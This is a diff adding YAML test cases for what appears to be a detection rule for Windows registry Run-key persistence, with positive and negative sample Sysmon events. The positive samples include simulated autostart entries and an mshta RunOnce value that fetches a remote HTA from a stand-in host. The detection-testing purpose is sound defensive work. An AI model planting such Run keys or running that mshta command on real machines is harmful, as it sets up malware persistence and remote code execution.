@@ -1,0 +1,32 @@
+positive:
+  - description: OP-001 persistence, PowerShell writes HKCU Run
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Run\Updater'
+      Details: 'C:\Users\Public\updater.exe'
+  - description: OP-002 Phase 3, reg.exe writes HKCU Run (the case the old title hid)
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\reg.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper'
+      Details: 'C:\Users\labuser\AppData\Roaming\sync.vbs'
+  - description: mshta writes HKLM RunOnce
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\mshta.exe'
+      TargetObject: 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\Init'
+      Details: 'mshta.exe http://example.invalid/a.hta'
+negative:
+  - description: OneDrive registering its own autostart
+    event:
+      EventID: 13
+      Image: 'C:\Users\labuser\AppData\Local\Microsoft\OneDrive\OneDrive.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive'
+      Details: '"C:\Users\labuser\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'
+  - description: PowerShell writing an unrelated key
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt'
+      Details: 'DWORD (0x00000000)'
